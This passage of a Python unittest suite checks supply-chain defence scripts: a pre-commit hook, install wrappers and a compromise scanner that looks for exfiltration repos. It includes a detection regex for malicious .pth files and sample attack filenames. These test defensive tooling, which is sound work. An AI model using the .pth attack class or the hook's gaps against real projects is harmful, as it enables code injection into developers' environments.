        # The fallback chain: HOOKS_DIR = $(read core.hooksPath) OR <gitdir>/hooks.
        self.assertIn(
            'HOOKS_DIR="${GITDIR}/hooks"', src,
            "install-precommit.sh must fall back to <gitdir>/hooks "
            "when core.hooksPath is unset"
        )

    def test_installer_announces_hookspath_redirect(self):
        src = (_REPO_ROOT / "scripts" / "install-precommit.sh").read_text(
            encoding="utf-8"
        )
        # When core.hooksPath IS set, the installer must say so —
        # silently writing to a different path would confuse the user.
        self.assertIn(
            "core.hooksPath is set", src,
            "install-precommit.sh must announce when redirecting "
            "to a non-default hooks path"
        )


class SandboxInstallBatForLoopScopeTests(unittest.TestCase):
    """Gemini medium on 49702c0 (2026-05-22): scripts/sandbox_install.bat
    referenced ``%%V`` outside the for-loop body where it was defined.
    In cmd.exe, the for-loop variable is undefined outside the loop
    so the literal text ``%V`` printed in the user message. Cosmetic
    but confusing — the user sees ``Run "set %V=" for each before
    continuing`` and has no idea what to do.

    Fix: replace with a generic ``Run "set VAR=" for each variable
    above before continuing`` that references the prior loop output
    by structure, not by variable name."""

    def test_no_loop_var_reference_in_warned_block(self):
        src = (_REPO_ROOT / "scripts" / "sandbox_install.bat").read_text(
            encoding="utf-8"
        )
        # The specific buggy line: ``Run "set %%V=" for each ...`` inside
        # the ``if "!WARNED!"=="1" (...)`` block AFTER the for-loop closes.
        # That block runs in cmd's main scope, where %%V is undefined.
        # The fix replaces the dynamic-var reference with a generic
        # ``set VAR=`` placeholder.
        # Forbidden: any non-commented line that references %%V in the
        # warning message we print to the user.
        self.assertNotIn(
            'Run "set %%V=" for each before continuing', src,
            "sandbox_install.bat regressed to %%V reference in the user-"
            "facing warning message (where %%V is undefined outside the "
            "for-loop scope and prints as literal '%V')"
        )
        # The new safe form must be present.
        self.assertIn(
            'set VAR=', src,
            "sandbox_install.bat warning must use generic ``set VAR=`` "
            "placeholder, not a for-loop variable reference"
        )


class DetectCompromiseRepoLimitWarningTests(unittest.TestCase):
    """Gemini security-medium on 49702c0 (2026-05-22): when the
    account has MORE than --limit GitHub repos, ``gh repo list``
    silently truncates and the scanner could miss an exfil repo in
    the un-scanned tail. The original code reported "all clear"
    even when the scan was incomplete.

    Fix: detect when ``len(repos) >= --limit`` and surface a warning
    in the check details (and flag the check as not-ok so the run's
    exit code reflects the incomplete scan)."""

    def test_repo_check_warns_on_truncation(self):
        src = (_REPO_ROOT / "scripts" / "detect_compromise.py").read_text(
            encoding="utf-8"
        )
        # Must define a REPO_LIMIT constant (or equivalent).
        self.assertIn(
            "REPO_LIMIT = 1000", src,
            "detect_compromise.py must define REPO_LIMIT explicitly so "
            "the truncation check can compare against it"
        )
        # Must do the truncation check.
        self.assertIn(
            "len(repos) >= REPO_LIMIT", src,
            "detect_compromise.py must detect truncation by comparing "
            "the returned count against the requested limit"
        )
        # Must surface the warning as a non-ok CheckResult on the no-hits path.
        self.assertIn(
            "truncation_warning", src,
            "detect_compromise.py must use a named truncation_warning "
            "variable to surface the incomplete-scan finding"
        )


class SandboxInstallPythonDetectionTests(unittest.TestCase):
    """Subagent HIGH on 7653c73 (2026-05-22): sandbox_install.bat
    originally only tried ``where python`` (line 13), unlike its .sh
    sibling which tries ``python3.11 python3.12 python3 python`` and
    unlike its safe_install.bat sibling which tries python3 then
    python. On a Chocolatey-style Windows install where python3 is on
    PATH but python is not (uncommon but real), the .bat aborted with
    FATAL despite a valid interpreter being available.

    Fix on 7653c73-next: match safe_install.bat's pattern — try
    python3 first, then python."""

    def test_sandbox_install_bat_tries_python3_first(self):
        src = (_REPO_ROOT / "scripts" / "sandbox_install.bat").read_text(
            encoding="utf-8"
        )
        # The forbidden pattern: only ``where python`` (no python3 attempt).
        # We confirm by counting ``where python3`` invocations.
        self.assertIn(
            "where python3", src,
            "sandbox_install.bat must try python3 before python "
            "(some Chocolatey installs only expose python3 on PATH)"
        )
        # And the canonical ``where python3 >nul 2>nul`` pattern.
        self.assertIn(
            'where python3 >nul 2>nul && set "PY=python3"', src,
            "sandbox_install.bat python3 detection must follow the "
            "canonical ``where ... >nul 2>nul && set PY=...`` pattern"
        )
        # Plain ``where python`` (no 3) must still be tried as fallback.
        self.assertIn(
            'where python >nul 2>nul && set "PY=python"', src,
            "sandbox_install.bat must still try plain ``python`` "
            "as a fallback when python3 is missing"
        )


class DetectCompromiseExitCodeContractTests(unittest.TestCase):
    """Subagent CRITICAL on b807560 (2026-05-22): detect_compromise.py
    emits exit code 0 (clean) or 1 (alerts) — a 2-tier producer. The
    pre-commit hook + safe_install wrappers were originally written
    against a hypothetical 3-tier protocol (0=clean, 1=warnings,
    2+=alerts), gating ``FAILED=1`` on ``code >= 2`` and treating
    ``code == 1`` as non-blocking warnings.

    Net effect: real IoC alerts (code=1) silently became "warnings"
    and the commit/install went through. Local developer audit gates
    were fully bypassed; only CI (which treats any non-zero as
    failure) was protecting.

    Lock the contract at the source level so a future refactor can't
    silently reintroduce the 3-tier ``>= 2`` gate."""

    def test_detect_compromise_only_exits_0_or_1(self):
        """The producer side: confirm detect_compromise.py only emits
        0 or 1, so callers know the 2-tier contract is real."""
        src = (_REPO_ROOT / "scripts" / "detect_compromise.py").read_text(
            encoding="utf-8"
        )
        # Find every ``return N`` and ``sys.exit(N)`` in main().
        # main() is the last function in the file.
        main_idx = src.find("def main(")
        self.assertGreater(main_idx, 0, "main() not found in detect_compromise.py")
        main_body = src[main_idx:]
        # The only acceptable terminal codes are 0 and 1.
        # ``return 2`` etc. inside main() would break the caller contract.
        import re
        terminal_codes = set(re.findall(r"return\s+([0-9]+)\b", main_body))
        # main() can call helper functions that themselves return non-0/1
        # (e.g. CheckResult-builders) — we only care about ``return N``
        # at the main()-function level. The current main() has return 0
        # and return 1; check the set is a subset of {"0", "1"}.
        self.assertTrue(
            terminal_codes.issubset({"0", "1"}),
            f"detect_compromise.py main() returns codes outside the 2-tier "
            f"contract: {terminal_codes - set(['0', '1'])}; update the "
            f"caller logic in scripts/git-hooks/pre-commit + "
            f"scripts/safe_install.{{sh,bat}} if you intentionally add a "
            f"new tier"
        )

    def test_precommit_hook_treats_any_nonzero_as_block(self):
        """The consumer side (pre-commit hook): any non-zero exit from
        detect_compromise.py must block the commit. The prior ``>= 2``
        gate let alerts through silently."""
        src = (_REPO_ROOT / "scripts" / "git-hooks" / "pre-commit").read_text(
            encoding="utf-8"
        )
        # The forbidden pattern: the project-audit branch gating ``FAILED=1``
        # on ``$code -ge 2``. (The machine-audit block legitimately uses
        # ``-ge 2`` because the external hulud-audit.sh IS 3-tier; we only
        # care about the detect_compromise.py invocation block here.)
        # Locate the block that invokes detect_compromise.py.
        anchor = '"$PY" "$PROJECT_SCRIPT" --repo-root'
        self.assertIn(
            anchor, src,
            f"pre-commit hook must invoke detect_compromise.py with "
            f"--repo-root (got something else); see anchor {anchor!r}"
        )
        anchor_idx = src.find(anchor)
        # Look at the 400 chars after the anchor — that's the gate block.
        gate_block = src[anchor_idx:anchor_idx + 400]
        # MUST contain a ``-ne 0`` gate (block on any non-zero).
        self.assertIn(
            "$code -ne 0", gate_block,
            "pre-commit hook project-audit block must block on -ne 0, "
            "NOT -ge 2 (the latter silently allows IoC alerts through)",
        )
        # MUST NOT contain ``code -ge 2`` in this block.
        self.assertNotIn(
            "$code -ge 2", gate_block,
            "pre-commit hook project-audit block regressed to >= 2 gate "
            "— this silently allows alerts (code=1) through"
        )

    def test_safe_install_sh_treats_any_nonzero_as_alert(self):
        src = (_REPO_ROOT / "scripts" / "safe_install.sh").read_text(
            encoding="utf-8"
        )
        # Whole-file source assertions — the gate behavior is a global
        # property of the script (only ONE audit_code path), so we don't
        # need slice surgery here.
        self.assertIn(
            "audit_code=$?", src,
            "safe_install.sh must capture audit exit into audit_code"
        )
        # MUST contain the ``-ne 0`` gate.
        self.assertIn(
            "$audit_code -ne 0", src,
            "safe_install.sh must alert on any non-zero audit_code"
        )
        # Forbidden patterns: the prior 3-tier gates.
        self.assertNotIn(
            "$audit_code -ge 2", src,
            "safe_install.sh regressed to >= 2 gate (silently allows alerts)"
        )
        self.assertNotIn(
            "audit_code -eq 1", src,
            "safe_install.sh regressed to ``warnings continue`` branch "
            "(the old 3-tier shape that masqueraded alerts as warnings)"
        )

    def test_safe_install_bat_treats_any_nonzero_as_alert(self):
        src = (_REPO_ROOT / "scripts" / "safe_install.bat").read_text(
            encoding="utf-8"
        )
        # Same contract for the .bat variant: any non-zero audit_code is an alert.
        self.assertIn(
            'if not "!audit_code!"=="0"', src,
            "safe_install.bat must alert on any non-zero audit_code"
        )
        # Forbidden: ``GEQ 2`` gate.
        self.assertNotIn(
            "audit_code! GEQ 2", src,
            "safe_install.bat regressed to GEQ 2 gate"
        )
        self.assertNotIn(
            "audit_code% GEQ 2", src,
            "safe_install.bat regressed to GEQ 2 gate (delayed-expansion variant)"
        )


class PrecommitDepPatternPthCoverageTests(unittest.TestCase):
    """Subagent HIGH on b807560 (2026-05-22): the pre-commit hook's
    DEP_PATTERN regex had an arm ``\\.pth`` that only matched a file
    whose entire basename was literally ``.pth`` (a hidden file). Real
    malicious .pth files have names like ``litellm.pth`` or
    ``attack.pth`` and were silently skipped — the .pth attack class
    bypassed the audit trigger entirely. Fixed: arm is now
    ``[^/]*\\.pth`` matching any basename ending in .pth.

    Verify the fixed pattern against representative .pth filenames."""

    @staticmethod
    def _extract_dep_pattern() -> str:
        """Pull DEP_PATTERN= from the tracked hook source."""
        src = (_REPO_ROOT / "scripts" / "git-hooks" / "pre-commit").read_text(
            encoding="utf-8"
        )
        import re
        m = re.search(r"^DEP_PATTERN='([^']+)'", src, re.MULTILINE)
        if not m:
            raise AssertionError("DEP_PATTERN= not found in scripts/git-hooks/pre-commit")
        return m.group(1)

    def test_pth_files_with_real_names_match(self):
        """The class of .pth files that the original regex MISSED."""
        import re
        pattern = self._extract_dep_pattern()
        # Bash extended regex anchors $ at end-of-string;
        # Python re respects the same with re.search anchored.
        rx = re.compile(pattern)
        positives = [
            "evil.pth",
            "litellm.pth",
            "attack.pth",
            ".pth",                                          # the historical-only match
            "site-packages/attack.pth",
            "venv/lib/python3.12/site-packages/poison.pth",
        ]
        for name in positives:
            self.assertTrue(
                rx.search(name),
                f"DEP_PATTERN regression: {name!r} should match .pth arm "
                f"but doesn't; the .pth attack class can bypass the hook again",
            )

    def test_non_pth_files_still_dont_falsely_match(self):
        """The arm must not accidentally match .pth-suffix-but-not-equal."""
        import re
        pattern = self._extract_dep_pattern()
        rx = re.compile(pattern)
        negatives = [
            "README.pythonic",       # .pth substring but not a real .pth
            "foo.pth.bak",           # .pth in middle, not at end
            "python-config",         # contains 'pth' substring? no — fine
            "src/main.py",           # totally unrelated
        ]
        for name in negatives:
            self.assertFalse(
                rx.search(name),
                f"DEP_PATTERN false positive: {name!r} should NOT match "
                f"but does"
            )


class SafeInstallNoPythonHandlingTests(unittest.TestCase):
    """Subagent HIGH on b807560 (2026-05-22): when neither ``python3``
    nor ``python`` is in PATH, the original safe_install wrappers set
    ``PY=python`` (fallback), executed it, got exit 127, and under
    the soon-to-be-fixed ``>= 2 = ALERT`` logic printed a "AUDIT FOUND
    ALERTS" message. A misconfigured PATH masqueraded as a real
    security finding.

    Fix: explicit ``command -v`` / ``where`` gate on the chosen PY +
    distinct "audit skipped" exit path."""

    def test_sh_uses_explicit_command_v_gate(self):
        src = (_REPO_ROOT / "scripts" / "safe_install.sh").read_text(
            encoding="utf-8"
        )
        # The forbidden pattern: ``PY=python3; command -v python3 || PY=python``
        # which sets PY=python unconditionally on PATH-miss.
        self.assertNotIn(
            'command -v python3 >/dev/null 2>&1 || PY="python"', src,
            "safe_install.sh regressed to unconditional PY=python fallback"
        )
        # The new pattern: PY="" initially + explicit check before invoking.
        self.assertIn('PY=""', src)
        self.assertIn("no python found in PATH", src)
        self.assertIn("audit skipped", src)

    def test_bat_uses_explicit_where_gate(self):
        src = (_REPO_ROOT / "scripts" / "safe_install.bat").read_text(
            encoding="utf-8"
        )
        # The forbidden pattern: ``where python3 >nul 2>&1; if errorlevel 1
        # set PY=python; else set PY=python3`` which sets PY=python on
        # PATH-miss without verifying python exists either.
        self.assertNotIn(
            "if errorlevel 1 (set PY=python) else", src,
            "safe_install.bat regressed to unconditional PY=python fallback"
        )
        # The new pattern: empty PY default + ``where`` check on EACH candidate.
        self.assertIn('set "PY="', src)
        self.assertIn("no python found in PATH", src)
        self.assertIn("audit skipped", src)


class InstallPrecommitWorktreeTests(unittest.TestCase):
    """Subagent MEDIUM on b807560 (2026-05-22): the installer's
    pre-existing repo check was ``[ ! -d "$REPO_ROOT/.git" ]`` which
    returns fatal for git worktrees (where ``.git`` is a FILE, not a
    dir, pointing at the real gitdir). Fix: ask git itself for the
    gitdir via ``git rev-parse --git-dir`` — handles plain repos,
    worktrees, and submodules uniformly.

    Same commit: timestamped backups instead of single .bak slot
    so two consecutive runs don't overwrite a developer's custom
    pre-commit on the second run."""

    def test_installer_uses_git_rev_parse_not_dir_check(self):
        src = (_REPO_ROOT / "scripts" / "install-precommit.sh").read_text(
            encoding="utf-8"
        )
        # The forbidden pattern: ``[ ! -d "${REPO_ROOT}/.git" ]`` (only checks dir).
        self.assertNotIn(
            '[ ! -d "${REPO_ROOT}/.git" ]', src,
            "install-precommit.sh regressed to dir-only .git check "
            "(breaks in git worktrees)"
        )
        # The new pattern: rev-parse --git-dir.
        self.assertIn(
            "git rev-parse --git-dir", src,
            "install-precommit.sh must use git rev-parse to handle worktrees"
        )

    def test_installer_uses_timestamped_backups(self):
        src = (_REPO_ROOT / "scripts" / "install-precommit.sh").read_text(
            encoding="utf-8"
        )
        # The forbidden pattern: backup to fixed ``.bak`` (single slot).
        self.assertNotIn(
            'cp "$HOOK_DST" "${HOOK_DST}.bak"', src,
            "install-precommit.sh regressed to single .bak backup slot "
            "(second run overwrites developer's custom hook)"
        )
        # The new pattern: timestamped backup.
        self.assertIn(
            "backup_ts=", src,
            "install-precommit.sh must use timestamped backup"
        )
        self.assertIn(
            ".bak.${backup_ts}", src,
            "install-precommit.sh must include timestamp in backup name"
        )


class DetectCompromiseFlagNameTests(unittest.TestCase):
    """Subagent LOW on b807560 (2026-05-22): callers invoked
    detect_compromise.py with ``--root`` (relying on argparse's
    abbreviation matching), but the actual arg is ``--repo-root``.
    Fragile — if a future ``--root-something`` arg is added, argparse
    raises ``ambiguous option`` and ALL callers break silently.

    Fix: spell the full flag name everywhere."""

    def test_callers_use_full_flag_name(self):
        for name in (
            "scripts/git-hooks/pre-commit",
            "scripts/safe_install.sh",
            "scripts/safe_install.bat",
        ):
            src = (_REPO_ROOT / name).read_text(encoding="utf-8")
            # Check the detect_compromise invocation block for ``--root``
            # (the historical fragile abbreviation) vs ``--repo-root``
            # (the canonical full spelling).
            # Grep for the detect_compromise invocation block and check.
            import re
            invocations = re.findall(
                r'detect_compromise(?:\.py)?["\s][^|\n;()]+',
                src,
            )
            # At least one invocation block exists in each caller.
            self.assertGreater(
                len(invocations), 0,
                f"{name} has no detect_compromise invocation"
            )
            for inv in invocations:
                if "--root" in inv and "--repo-root" not in inv:
                    self.fail(
                        f"{name} uses --root (argparse abbreviation, "
                        f"fragile) instead of --repo-root: {inv!r}"
                    )


if __name__ == "__main__":
    unittest.main()
